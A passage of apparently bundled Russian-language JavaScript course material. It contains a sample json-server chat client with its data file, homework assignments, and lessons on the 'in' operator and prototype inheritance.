auto;\n}\n\n.user-name {\n  color: #09b;\n  font-weight: bold;\n}\n\nsup {\n  font-size: 10px;\n  position: absolute;\n  right: 16px;\n  color: #888;\n}\n\n.user-avatar {\n  margin-right: 16px;\n  max-height: 48px;\n  max-width: 48px;\n}\n\n.active-user-message {\n  background: #dfd;\n}\n\np {\n  font-family: Arial;\n  font-size: 12px;\n  color: #777;\n}\n~~~\n^^^\n\n________________________________________________\n\n^^^[addElement.js]\n~~~js\nfunction addElement (tagName, container = document.body) {\n  return (container.nodeType === 1 ? container : document.body)\n    .appendChild(document.createElement(tagName))\n}\n~~~\n^^^\n\n^^^[callback.js]\n~~~js\nfunction callback (timestamp) {\n  if (timestamp - this.timestamp >= 500) {\n    Object.assign(this, { timestamp })\n    this.getData(\'lastUpdate\')\n      .then(({ date: updated }) => {\n        if (updated > this.updated) {\n          this.refresh()\n            .then(() => {\n              Object.assign(this, { updated })\n              this.setActive()\n              this.updateChat()\n            })\n        }\n      })\n  }\n  requestAnimationFrame(this.callback)\n}\n~~~\n^^^\n\n^^^[inputMessageCallback.js]\n~~~js\nfunction inputMessageCallback (event) {\n  this.postMessage(event)\n    .then(() => {\n      this.setLastUpdated()\n        .then(() => {\n          this.setActive()\n            .then(() => Object.assign(event.target, { value: \'\' }))\n        })\n    })\n}\n~~~\n^^^\n\n^^^[createUserAvatar.js]\n~~~js\nfunction createUserAvatar (user) {\n  return Object.assign(new Image(), {\n    src: user.avatar,\n    className: \'user-avatar\'\n  })\n}\n~~~\n^^^\n\n^^^[updateChat.js]\n~~~js\nasync function updateChat () {\n  const { date: updated } = await this.getData(\'lastUpdate\')\n  if (updated === this.updated || !this.users) return\n  Object.assign(this, { updated })\n  this.messages = await this.getData(\'messages\')\n  this.initChat()\n}\n~~~\n^^^\n\n^^^[setActive.js]\n~~~js\nasync function setActive () {\n  const active = Date.now()\n  Object.assign(this.currentUser, { active })\n  return await fetch(`${this.host}/users/${this.currentUser.id}`, {\n    method: \'PATCH\',\n    headers: this.headers,\n    body: JSON.stringify({ active })\n  })\n}\n~~~\n^^^\n\n^^^[setLastUpdated.js]\n~~~js\nasync function setLastUpdated () {\n  this.updated = Date.now()\n  await fetch(`${this.host}/lastUpdate`, {\n    method: \'PUT\',\n    headers: this.headers,\n    body: JSON.stringify({\n      date: this.updated\n    })\n  })\n}\n~~~\n^^^\n\n^^^[postMessage.js]\n\n~~~js\nasync function postMessage () {\n  const message = {\n    user: this.currentUser.id,\n    date: Date.now(),\n    body: event.target.value\n  }\n  await fetch(`${this.host}/messages`, {\n    method: \'POST\',\n    headers: this.headers,\n    body: JSON.stringify(message)\n  })\n  this.createMessage(this.currentUser, message)\n}\n~~~\n\n^^^\n\n^^^[createMessage.js]\n~~~js\nfunction createMessage (user, message) {\n  const container = document.createElement(\'div\')\n  if (message.user === this.currentUser.id) {\n    Object.assign(container, { className: \'active-user-message\' })\n  }\n  container.appendChild(this.createUserAvatar(user))\n  Object.assign(this.addElement(\'span\', container), {\n    innerText: user.id,\n    className: \'user-name\'\n  })\n  this.addElement(\'span\', container)\n    .innerHTML = `<sup>${new Date(message.date).toLocaleString()}</sup>`\n  this.addElement(\'p\', container).innerText = message.body\n  this.chatContainer.insertBefore(container, document.querySelector(\'#anchor\'))\n  return container\n}\n~~~\n^^^\n\n^^^[initChat.js]\n~~~js\nfunction initChat () {\n  this.chatContainer.innerHTML = \'<div id="anchor"></div>\'\n  this.messages.forEach(message => {\n    const user = this.users.find(user => user.id === message.user)\n    this.createMessage(user, message)\n  })\n}\n~~~\n^^^\n\n^^^[refresh.js]\n~~~js\nasync function refresh () {\n  const { date: updated } = await this.getData(\'lastUpdate\')\n  Object.assign(this, { updated })\n  this.users = await this.getData(\'users\')\n  this.currentUser = this.users.find(user => Date.now() - user.active > 360000)\n  if (this.currentUser) this.setActive()\n\n  this.messages = await this.getData(\'messages\')\n  await this.initChat()\n}\n~~~\n^^^\n\n^^^[scroll.js]\n~~~js\nfunction scroll (mutationsList, observer) {\n  for (const mutation of mutationsList) {\n    if (mutation.type === \'childList\') {\n      mutation.target.scrollTop = mutation.target.scrollHeight\n    }\n  }\n}\n~~~\n^^^\n\n^^^[index.js]\n\n~~~js\nclass SimpleChat {\n  constructor () {\n    if (this.constructor.instance) {\n      console.warn(\'It\\\'s a singleton. You can\\\'t create one more instance.\')\n      return null\n    }\n\n    Object.assign(this, {\n      timestamp: 0,\n      users: null,\n      currentUser: null,\n      messages: [],\n      chatContainer: Object.assign(this.addElement(\'section\'), {\n        id: \'chat-container\',\n        className: \'chat-container\',\n        innerHTML: \'<div id="anchor"></div>\'\n      }),\n\n      callback: callback.bind(this)\n    })\n\n    this.refresh()\n\n    this.inputMessage = Object.assign(this.addElement(\'input\'), {\n      className: \'input-message\',\n      onchange: inputMessageCallback.bind(this)\n    })\n\n    const observer = new MutationObserver(scroll)\n    observer.observe(this.chatContainer, { childList: true })\n\n    requestAnimationFrame(this.callback)\n  }\n}\n\nObject.assign(SimpleChat.prototype, {\n  // host: \'https://garevna-chat.glitch.me\',\n  host: \'http://localhost:3000\',\n  headers: { \'Content-Type\': \'application/json\' },\n\n  addElement,\n  createUserAvatar,\n  initChat,\n  updateChat,\n  refresh,\n  createMessage,\n  setActive,\n  setLastUpdated,\n  postMessage,\n\n  async getData (ref) {\n    return await (await fetch(`${this.host}/${ref}`)).json()\n  }\n})\n~~~\n\n^^^\n\n~~~js\nconst chat = new SimpleChat\n~~~\n\n______________________________________________\n\n^^^[chat.json]\n\n~~~json\n{\n  "lastUpdate": {\n    "date": 1718015866392\n  },\n  "users": [\n    {\n      "id": "begemot",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/js-developer-1.png",\n      "active": 1718015876536\n    },\n    {\n      "id": "brian",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/pokemon-1.png",\n      "active": 1718015523790\n    },\n    {\n      "id": "free-boy",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/icon-01.jpg",\n      "active": 1718015866826\n    },\n    {\n      "id": "hasbeen",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/tin.jpg",\n      "active": 1718009561257\n    },\n    {\n      "id": "automat",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/ua-flag.png",\n      "active": 1718009660703\n    },\n    {\n      "id": "frodo",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/hand.png",\n      "active": 1549354550000\n    },\n    {\n      "id": "functional",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/js-cup-icon.png",\n      "active": 1549357800000\n    },\n    {\n      "id": "question",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/back.png",\n      "active": 1549556390000\n    },\n    {\n      "id": "lancet",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/cat-and-moon.jpg",\n      "active": 1549557400000\n    },\n    {\n      "id": "luke",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/uk-flag.png",\n      "active": 1552468320000\n    },\n    {\n      "id": "garevna",\n      "avatar": "https://cdn.glitch.global/89a3cf33-6cdf-4ca4-8537-1895e4d41aae/personage-to-right.gif",\n      "active": 1552468320000\n    }\n  ],\n  "messages": [\n    {\n      "id": 1,\n      "date": 1549354680000,\n      "user": "frodo",\n      "body": "Hello everybody here! What do you prefer: static or dynamic import?"\n    },\n    {\n      "id": 2,\n      "date": 1549354780000,\n      "user": "hasbeen",\n      "body": "The static import syntax can only be used at the top-level of the file"\n    },\n    {\n      "id": 3,\n      "user": "brian",\n      "date": 1549354950000,\n      "body": "Dynamic import() introduces a new function-like form of import that caters to those use cases"\n    },\n    {\n      "id": 4,\n      "date": 1549357900000,\n      "user": "functional",\n      "body": "Since import() returns a promise, it\'s possible to use async/await instead of the then-based callback style"\n    },\n    {\n      "id": 5,\n      "date": 1549556400000,\n      "user": "question",\n      "body": "Although import() looks like a function call, it is specified as syntax that just happens to use parentheses"\n    },\n    {\n      "id": 6,\n      "date": 1549557480000,\n      "user": "lancet",\n      "body": "The lazy-loading capabilities enabled by dynamic import() can be quite powerful when applied correctly"\n    },\n    {\n      "id": 7,\n      "date": 1552468440000,\n      "user": "luke",\n      "body": "Static import and dynamic import() are both useful"\n    },\n    {\n      "id": 8,\n      "date": 1552468440000,\n      "user": "garevna",\n      "body": "ws-json-server adds a little abstraction to websocket"\n    },\n    {\n      "user": "free-boy",\n      "date": 1717833840000,\n      "body": "Browser Support for ES6 (2015)?",\n      "id": 9\n    },\n    {\n      "user": "automat",\n      "date": 1717834020000,\n      "body": "ES6 is fully supported in all modern browsers since June 2017",\n      "id": 10\n    },\n    {\n      "user": "begemot",\n      "date": 1717937859804,\n      "body": "\'Funcs are our jam!\' (garevna)",\n      "id": 11\n    }\n  ]\n}\n~~~\n^^^\n\n__________________________________________________________________________________________________________________\n.\n'},8176:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\nСоздайте объект **womanBag**.\n\n~~~js\nconst womanBag = {\n  document: 'pasport',\n  lipstick: 'red',\n    ...\n}\n~~~\n\nСделайте его итерабельным.\n\n______________________________________________________________\n\n## ![ico-30 good] Fine\n\nСоздайте объект **womanBag**.\n\n~~~js\nconst womanBag = {\n  documents: ['pasport', ...],\n  cosmetics: ['lipstick', ...],\n  accessories: ['cigar-lighter', 'phone', ... ]\n  ...\n}\n~~~\n\nСделайте его итерабельным.\n\n^^Содержимое массивов должно итерироваться.^^\n\n________________________________________________________________\n\n## ![ico-30 exelent] Great\n\nЕсть объект:\n\n~~~js\nconst user = {\n  login: 'Stephan',\n  birthday: 1999,\n  hobby: 'footbal'\n}\n~~~\n\nЗадана функция:\n\n~~~js\nfunction userInfo (name, age, hobby) {\n  console.log(name, age, hobby)\n}\n~~~\n\nЧто нужно сделать, чтобы в результате вызова:\n\n~~~js\nuserInfo(...user)\n~~~\n\nна странице появились данные юзера, а в консоли было:\n\n~~~html\n<p>Stephan</p>  <p>1999</p>  <p>footbal</p>\n~~~\n"},35713:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-40 hw] Homework\n\n____________________________________________________________\n\n## ![ico-40 require] Satisfactorily\n\nСоздать веб-компонент выпадающее меню\n\n___________________________________________________________\n\n## ![ico-30 good] Fine\n\nСоздать веб-компонент регистрации нового юзера для вашего чатика на **json-server**\n\n___________________________________________________________\n\n## ![ico-30 exelent] Great\n\nСоздать веб-компонент [слайдер](samples/19), используя хуки жизненного цикла компонента.\n\n^^При вставке веб-компонента передача ссылки на JSON-файл с url\'s картинок (_pictures.json_) происходит через атрибут  **_src_**  элемента   **picture-slider** :^^\n\n~~~html\n<picture-slider src="pictures.json"></picture-slider>\n~~~\n'},42806:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-40 hw] Homework 1\n\n## ![ico-40 require] Satisfactorily\n\nНарисуйте блок-схему алгоритма, который проверяет значение входного параметра ** x**, и если это значение больше или равно 0, то возвращает в качестве результата строку "_Число положительное_", в противном случае - строку "_Число отрицательное_".\n\n_______________________________________________________________________\n\n## ![ico-30 good] Fine\n\nНарисуте блок-схему алгоритма суммирования 10 чисел, кратных 5 (начиная с 0).\n\n^^![ico-20 warn] просуммировать нужно десять чисел 5, 10, 15, 20, 25, 30, 35, 40, 45, 50.^^\n\n______________________________________________________________________\n\n## ![ico-30 exelent] Great\n\nНапилите код, который работает с массивом произвольных целых чисел.\n\n~~~js\nvar numbers = [254, 115, 78, 25, 91, 45, 37]\n~~~\n\nВаш скрипт должен вывести в консоль все числа больше 50.\n\n^^Посказка: используйте оператор цикла и условный оператор.^^\n\n_______________________________________________________\n\n### ![ico-25 draw-io] Как рисовать блок-схему\n\nДля выполнения блок-схемы используйте [![ico-20 link] бесплатный сервис](https://www.draw.io/)\n\n^^Экспортируйте блок-схему в формат  **svg**^^\n^^Вы получите код  **svg**^^\n^^Скопируйте этот код и вставьте в файл с названием "**scheme.svg**"^^\n^^Создайте локальный репо с именем "**lesson-01**"^^\n^^В этом репо создайте  **index.html**^^\n^^Вставьте свои данные ( фамилия, имя )^^\n^^Вставьте изображение **scheme.svg**^^\n\n_______________________________________________________\n\n### ![ico-25 octocat] github pages\n\nКак захостить приложение на github pages\n\n![ico-20 warn] ^^Теперь захостить приложение можно и с ветки **master**.^^\n\n![ico-25 git] ^^Создайте удаленный репо на гитхаб.^^\n^^Создайте ветку  **~gh-pages~**  в удаленном репо.^^\n^^(вы получите хостинг для своего мини-проекта)^^\n^^запушьте туда изменения из своего локального репо.^^\n^^Перейдите во вкладку **Settings**.^^\n\n![](illustrations/github-settings.png)\n\n^^Найдите раздел **GitHub Pages**^^\n\n![](illustrations/gh-pages.png)\n\n^^Откройте свою только что созданную страницу в браузере, используя ссылку **Your site is published at...**^^\n'},9426:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Оператор in\n\nПервым операндом оператора **~in~** является _имя свойства_ (строка)\n\nВторой операнд - _объект_, проверяемый на наличие такого свойства\n\nОператор **~in~** возвращает логическое значение\n\n• ~true~ если такое свойство есть у объекта\n• ~false~ если такого свойства нет\n\nНаличие указанного первым операндом свойства проверяется по всей цепочке прототипов\n\n~~~js\nvar sample = {\n  type: 'figure',\n  class: 'circle',\n  color: 'red'\n}\nconsole.log('type' in sample)     // true\n\nconsole.log('valueOf' in sample)  // true\n~~~\n\nВ данном примере метод **_~valueOf~_** является унаследованным, однако оператор **~in~** возвращает ~true~\n\n___________________________________\n\n## ![ico-25 icon] Массивы\n\n~~~js\nvar arr = [1, 2, 3]\n'valueOf' in arr  // true\n\n'valueOf' in [1, 2, 3] // true\n\n0 in [1, 2, 3] // true\n5 in [1, 2, 3] // false\n~~~\n\n_________________________________\n\n## ![ico-25 icon] Строки, числа и логические значения\n\nИх нужно \"завернуть\" в объект так:\n\n~~~js\nvar sample = String('Welcome to the hell')\n'length' in sample   // true\n\nvar number = new Number(5)\n'valueOf' in number  // true\n\nvar bool = new Boolean('5')\n'valueOf' in bool  // true\n~~~\n\nили так:\n\n~~~js\nvar sample = Object('Welcome to the hell')\n'length' in sample   // true\n\nvar number = Object(5)\n'valueOf' in number  // true\n\nvar bool = Object(false)\n'valueOf' in bool  // true\n~~~\n\n![ico-20 warn] Если не \"завернуть\" строку, число или логическое значение в объект, то при попытке использовать оператор **~in~** будет сгенерировано исключение ![ico-20 err] **~TypeError~**\n\n~~~js\nvar sample = 'Welcome to the hell'\n'length' in sample   // TypeError\n\nvar number = 5\n'valueOf' in number  // TypeError\n\nvar bool = true\n'valueOf' in bool   // TypeError\n~~~\n\n__________________________________\n\n## ![ico-25 icon] null | undefined\n\n\"Завернуть\" в объект можно также **_~null~_** и **_~undefined~_**\n\n~~~js\nvar sample = Object(null)\n'valueOf' in sample  // true\n\nvar sample = Object(undefined)\n'valueOf' in sample  // true\n~~~\n"},30836:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Модель наследования JS\n\nМодель наследования **_JS_** основана на понятии **прототипа**\n\n**Прототип** - это **объект**\n\n^^Предшественником JS в плане прототипной модели наследования является язык^^ [<img src="assets/self-logo.png" width="80"/>](http://www.selflanguage.org/)\n\n^^Стремление сделать синтаксис Javascript похожим на **Java** привело к появлению в языке таких "рудиментов", как ключевое слово **~new~**, лишенное практического смысла в языках с прототипной моделью наследования и создающее иллюзию наличия классов^^\n\nКласс - это абстракция, объект - это воплощение\n\n_________________________\n\n@@@@\n\n![](createPath("images", "smoke-monkey.gif"))\n![ico-25 yes] Уважаемые дамы и господа<br>Курение вредит вашему здоровью,<br>а курение конкретно в этом подъезде может вообще резко подорвать его\n\n@@@@\n\n__________________________________\n\n\n![ico-25 speach] **Класс и объект**\n^^Чашка - это абстракция,^^\n^^но чашка, из которой ты в данный момент пьешь чай - это конкретное воплощение абстракции "чашка"^^\n^^Для создания конкретного экземпляра класса "чашка" в классической модели используется ключевое слово **~new~**^^\n\n![ico-25 speach] **Наследование в классической модели**\n^^Абстракция "чашка" вложена в другую абстракцию - "емкость", поскольку емкостью также является кастрюля, и цистерна, и колба^^\n^^Таким образом, класс "чашка" наследует от класса "емкость"^^\n\n\nТак вот:\n\n![ico-25 yes] **в JS наследование происходит от _объекта_, а не _класса_**,\n\n**т.е. от _конкретного воплощения_, а не от абстракции**\n\nДругими словами, **JS** - очень конкретный язык ![ico-25 smile]\n\n_____________________________________________________________\n\n## ![ico-25 icon] prototype\n\nДля создания объекта в JS нам достаточно сделать следующее:\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar sample = {\n  name: \'master\'\n}\n~~~\n\nПри этом у нашего объекта "магическим образом" появляется свойство **_~&#95;&#95;proto&#95;&#95;~_**:\n\n~~~console\n▼ { name: "master" }\n    name: "master"\n  ► __proto__: Object\n~~~\n\nЭто свойство является ссылкой на объект **~prototype~**, который реально существует\n\nвнутри встроенного нативного объекта **~Object~**\n\nНа мой взгляд, это вполне соотносится с реальностью: \n![ico-20 question] можно ли получить наследство от _класса_ "дедушка" ?\n\n______________________\n\n@@@@\n\n![](createPath("images", "cat-no.gif"))\nДаже кошке понятно, что только **конкретный** дедушка может оставить вам наследство\n\n@@@@\n\n__________________________\n\nТаким образом, **~sample~** наследовал от **~Object~**\n\nЧтобы посмотреть, что же унаследовал **~sample~** от **~Object~**, давайте развернем его свойство **_~&#95;&#95;proto&#95;&#95;~_** в консоли:\n\n~~~~console\n▼ { name: "master" }\n    name: "master"\n  ► __proto__:\n      ► constructor: ƒ Object()\n      ► hasOwnProperty: ƒ hasOwnProperty()\n      ► isPrototypeOf: ƒ isPrototypeOf()\n      ► propertyIsEnumerable: ƒ propertyIsEnumerable()\n      ► toLocaleString: ƒ toLocaleString()\n      ► toString: ƒ toString()\n      ► valueOf: ƒ valueOf()\n      ► __defineGetter__: ƒ __defineGetter__()\n      ► __defineSetter__: ƒ __defineSetter__()\n      ► __lookupGetter__: ƒ __lookupGetter__()\n      ► __lookupSetter__: ƒ __lookupSetter__()\n      ► get __proto__: ƒ __proto__()\n      ► set __proto__: ƒ __proto__()\n~~~~\n\nСам "дедушка" **~Object~** не является наследством\n\nЛогично, что наследство "дедушки" где-то хранится...\n\nОно хранится в свойстве **~prototype~** "дедушки" (объекта **~Object~**)\n\nПроверим:\n\n^^^[Object.prototype]\n~~~console\n▼ {constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}\n  ► constructor: ƒ Object()\n  ► hasOwnProperty: ƒ hasOwnProperty()\n  ► isPrototypeOf: ƒ isPrototypeOf()\n  ► propertyIsEnumerable: ƒ propertyIsEnumerable()\n  ► toLocaleString: ƒ toLocaleString()\n  ► toString: ƒ toString()\n  ► valueOf: ƒ valueOf()\n  ► __defineGetter__: ƒ __defineGetter__()\n  ► __defineSetter__: ƒ __defineSetter__()\n  ► __lookupGetter__: ƒ __lookupGetter__()\n  ► __lookupSetter__: ƒ __lookupSetter__()\n  ► get __proto__: ƒ __proto__()\n  ► set __proto__: ƒ __proto__()\n~~~\n^^^\n\nНапример, "наследство" включает метод **_~hasOwnProperty~_**\n\nДавайте попробуем его использовать:\n\n~~~js\nsample.hasOwnProperty(\'name\')   // true\n~~~\n\nО-па, мы получили ~true~, т.е. метод работает!\n\nЗначит, наследство благополучно получено ![ico-25 smile]\n\n![ico-25 question] зачем нам вообще нужно ключевое слово **~new~** ?\n\nИтак, сделаем выводы:\n\n![ico-20 green-ok] "наследство" хранится в свойстве **~prototype~** "дедушки"\n![ico-20 green-ok] "наследник" получает свойство **_~&#95;&#95;proto&#95;&#95;~_**\n![ico-20 green-ok] свойство **_~&#95;&#95;proto&#95;&#95;~_** является ссылкой на  сундук с наследством ( объект **~prototype~** )\n\n_________________________________________________________________\n\n## ![ico-25 icon] constructor\n\nТеперь обратим внимание на первое, что мы видим в объекте **~prototype~** конструктора и в свойстве **_~&#95;&#95;proto&#95;&#95;~_** экземпляра\n\nЭто свойство **~constructor~**\n\nЗначение у него ••_ ƒ_ Object()••\n\nБуковка ~ ƒ~ говорит нам, что это функция\n\n~Object()~ говорит нам, что эта функция - конструктор **~Object~**\n\nИтак, мы выяснили, что встроенный нативный объект **~Object~**:\n\n• является функцией\n• выступает в роли **~constructor~**\n\nТаким образом, в сундуке с наследством (объекте **~prototype~**) есть ссылка на "дедушку", от которого наследство получено\n\nКроме того, "дедушка" является **функцией**\n\nИ у "дедушки" вполне конкретная роль - он **~constructor~**\n\nТеперь вопрос: а что сделало его **_конструктором_** ?\n\n___________________________________________________________________\n\nПроделаем следующий "финт":\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconsole.dir(function Sigma () {})\n~~~\n\nи обратим внимание на наличие свойства **~prototype~**,\n\nв котором есть свойство **~constructor~**\n\n~~~console\n▼ ƒ Sigma()\n    arguments: null\n    caller: null\n    length: 0\n    name: "Sigma"\n  ▼ prototype:\n    ► constructor: ƒ Sigma()\n    ► __proto__: Object\n  ► __proto__: ƒ ()\n~~~\n\nКуда показывает свойство **~constructor~** ? - на функцию **_~Sigma~_**\n\nТо есть она по дефолту уже конструктор\n\nУ нее есть все, чтобы выступать в роли "дедушки"\n\nДавайте именовать такие объекты "**конструкторы**", а не "_дедушки_" - это ближе к семантике языка\n\nИ опять обращаю ваше внимание на тот факт, что у нас все совершенно конкретно, нет никаких абстракций, никаких классов - только объекты ( функции тоже объекты )\n\nСовершенно конкретная функция **_~Sigma~_** уже готова предоставить своим наследникам свой совершенно конкретный объект **~prototype~** в качестве наследства\n\nОсталось только вызвать ее с ключевым словом **~new~**:\n\n~~~js\nvar obj = new Sigma\n~~~\n\nи мы получим наследника...\n\nА можно ли без **~new~** передать наследство ?\n\n~~~js\nfunction Sigma () {}\n\nSigma.prototype.say = function () {\n  console.log(\'I\\\'m the instance of Sigma: \', this instanceof Sigma)\n}\nvar obj = {}\nobj.__proto__ = Sigma.prototype\n~~~\n\nИ у нас все в шоколаде!\n\nОдна строчка:\n\n~~~js\nobj.__proto__ = Sigma.prototype\n~~~\n\nсделала объект **~obj~** наследником **~Sigma~**\n\nПричем оператор _~instanceof~_ совершенно благопристойно возвращает нам ~true~, как будто **~obj~** является экземпляром класса **~Sigma~**:\n\n~~~js\nobj.say()\n~~~\n\n**Результат в консоли:** ••I\'m the instance of Sigma:  true••\n\nНо ведь не существует никакого класса **~Sigma~** - совершенно справедливо заметите вы\n\nИ правильно сделаете ![ico-20 smile]\n\n**~Sigma~** - просто функция, а не класс\n\n^^Мы ей дали имя, начинающееся с литеры в верхнем регистре, чтобы придать ей "статус класса" - чистая липа^^\n\nНа самом деле все, что произошло - это помещение ссылки на объект **_~prototype~_** функции **~Sigma~** в свойство **_~&#95;&#95;proto&#95;&#95;~_** объекта **~obj~**\n\n^^Зачем же имитировать классовую модель, пряча "под капот" истинную природу наследования в JS ?^^\n\n^^Это сбивает с толку, приводит к непониманию истинной природы происходящего^^\n\nВ этом примере мы столкнулись с еще одним важным явлением - **_~this~_**\n\nРанее мы уже сталкивались с ключевым словом **_~this~_** в контексте исполнения функций\n\nДавайте заглянем еще разок\n\n_________________________________________________________________________\n\n## ![ico-25 icon] this\n\nИтак, мы уже поняли, что любая функция в JS является конструктором по своей сути, поскольку имеет контейнер для "наследства" - свойство **_~prototype~_**\n\nНо что еще мы знаем о функциях JS ?\n\nМы знаем, что в момент вызова у них появляется ссылка на контекст вызова - **~this~**\n\nВы заметили, что в примере выше внутри функции **~say~** использовано это ключевое слово ?\n\nСама функция **~say~** находится внутри объекта **_~prototype~_** функции **~Sigma~**\n\nДавайте изменим функцию **~say~**, не трогая все остальное:\n\n~~~js\nSigma.prototype.say = function () {\n  console.log(`My name is ${this.name}`)\n}\n~~~\n\nи добавим объекту **~obj~** свойство **_~name~_**:\n\n~~~js\nobj.name = \'Google\'\n~~~\n\nТеперь вызовем метод **~say~**, который унаследовал объект **~obj~**:\n\n~~~js\nobj.say()   // My name is  Google\n~~~\n\nТыц, _~this.name~_ оказался "Google" !\n\nт.е. ~this~ является ссылкой на **~obj~** !\n\nЭто как?\n\nДа все правильно и закономерно:\n\n• во-первых, метод **_~say~_** доступен объекту **~obj~**, потому что унаследован\n• а во-вторых, при вызове ~obj.say()~ мы конкретно указали контекст вызова\n\nДругими словами, когда один из наследников вызывает унаследованный метод, то контекстом вызова этого метода будет данный конкретный наследник\n\nКто вызвал - на того и покажет **~this~** внутри метода\n\nВедь **~this~** - это же ссылка на **контекст вызова**\n\nТо есть каждый наследник может попользоваться, и в момент, когда он пользуется, этот метод принадлежит ему\n\nферштейн? ![ico-25 smile]\n\n__________________________________________________________________________\n\n## ![ico-25 icon] Цепочка прототипов\n\nОбратите внимание, что в предыдущем примере мы создали объект **~obj~** с двумя вложенными свойствами **_~&#95;&#95;proto&#95;&#95;~_**\n\n~~~console\n▼ Sigma {name: "Google"}\n    name: "Google"\n  ▼ __proto__:\n    ► say: ƒ ()\n    ► constructor: ƒ Sigma()\n    ► __proto__: Object\n~~~\n\nпервое свойство **_~&#95;&#95;proto&#95;&#95;~_** является ссылкой на **_объект_**, который содержит:\n\n• свойство **_~say~_**\n    • функция, которая выводит в консоль значение _~this.name~_\n• свойство **_~constructor~_**\n    • ссылка на функцию **~Sigma~**\n• еще одно свойство **_~&#95;&#95;proto&#95;&#95;~_**\n    • ссылка на объект **_~prototype~_** конструктора **~Object~**\n\nИтак, наша цепочка прототипов состоит уже из двух звеньев\n\nЭтих звеньев может быть значительно больше\n\nЧто это означает?\n\nЧто при обращении к какому-либо свойству ( методу ) экземпляра **~obj~** поиск будет происходить сверху вниз по цепочке прототипов\n\nЗначит, если свойство с таким именем есть на нескольких уровнях, то будет использовано значение, которое находится выше остальных в цепочке прототипов\n\n________________________________________________________\n\n## ![ico-25 icon] Конструктор Object\n\n**~Object~** - это "Адам" всех объектов в JS\n\nКорень, от которого все произрастает\n\nСсылка на его свойство **_~prototype~_** будет последним звеном в любой цепочке прототипов, перед "жирной точкой" в конце - **~null~**\n\nОднако у вас полная свобода творить\n\nВы можете создать объект без прототипа, например, так:\n\n~~~js\nvar obj = Object.create(null)\n~~~\n\n^^(сразу поставили "жирую точку")^^\n\nили так:\n\n~~~js\nvar obj = {}\nobj.__proto__ = null\n~~~\n\n_____________________________________________________\n\n\n### ![ico-20 icon] Статические свойства Object\n\n**собственные свойства конструктора ~Object~**\n\nСвойства и методы объекта  **Object**, которые не находятся в свойстве  **~prototype~**, не наследуются экземплярами, и могут быть вызваны только как свойства и методы объекта  **Object**:\n\n~~~~console\n▼ Object()\n    arguments: (...)\n  ► assign: ƒ assign()\n    caller: (...)\n  ► create: ƒ create()\n  ► defineProperties: ƒ defineProperties()\n  ► defineProperty: ƒ defineProperty()\n  ► entries: ƒ entries()\n  ► freeze: ƒ freeze()\n  ► fromEntries: ƒ fromEntries()\n  ► getOwnPropertyDescriptor: ƒ getOwnPropertyDescriptor()\n  ► getOwnPropertyDescriptors: ƒ getOwnPropertyDescriptors()\n  ► getOwnPropertyNames: ƒ getOwnPropertyNames()\n  ► getOwnPropertySymbols: ƒ getOwnPropertySymbols()\n  ► getPrototypeOf: ƒ getPrototypeOf()\n  ► is: ƒ is()\n  ► isExtensible: ƒ isExtensible()\n  ► isFrozen: ƒ isFrozen()\n  ► isSealed: ƒ isSealed()\n  ► keys: ƒ keys()\n    length: 1\n    name: "Object"\n  ► preventExtensions: ƒ preventExtensions()\n  ► prototype: {constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}\n  ► seal: ƒ seal()\n  ► setPrototypeOf: ƒ setPrototypeOf()\n  ► values: ƒ values()\n  ► __proto__: ƒ ()\n~~~~\n\nПоскольку они не передаются экземплярам, их называют **_статическими_**\n\n____________________________________\n\nВоспользуемся методом **~Object.create~** для создания нового экземпляра объекта:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nvar sample = Object.create({ type: \'figure\' })\nsample.name = \'circle\'\n~~~\n\nи выведем его в консоль:\n\n~~~console\n▼ { name: "circle" }\n    name: "circle"\n  ▼ __proto__:\n        type: "figure"\n      ► __proto__: Object\n~~~\n\nКак видите, мы опять обошлись без ключевого слова **~new~**,\nи благополучно создали экземпляр **~sample~**,\nу которого первым звеном в цепочке прототипов является ссылка на безымянный объект ~{ type: "figure" }~,\nа далее следует ссылка на свойство **_~prototype~_** конструктора **~Object~**\n\n_________________________________________\n\nВоспользуемся методом **~Object.setPrototypeOf()~**:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nvar sample = {\n  name: \'circle\'\n}\nvar sample = Object.setPrototypeOf(sample, { type: \'figure\' })\n~~~\n\nРезультат будет абсолютно такой же, как в предыдущем примере, и мы опять обошлись без ключевого слова **~new~**\n\n"Похимичим" далее:\n\n~~~js\nvar test = Object.create(sample)\ntest.draw = function () {\n  console.log(this.name)\n}\n~~~\n\nНовый экземпляр ~test~ наследует от объекта ~sample~ все, включая его цепочку прототипов:\n\n~~~console\n▼ { draw: ƒ }\n    draw: ƒ ()\n  ▼ __proto__:\n        name: "circle"\n      ► __proto__:\n            type: "figure"\n          ► __proto__: Object\n~~~\n\nПравда, при этом у нас нет 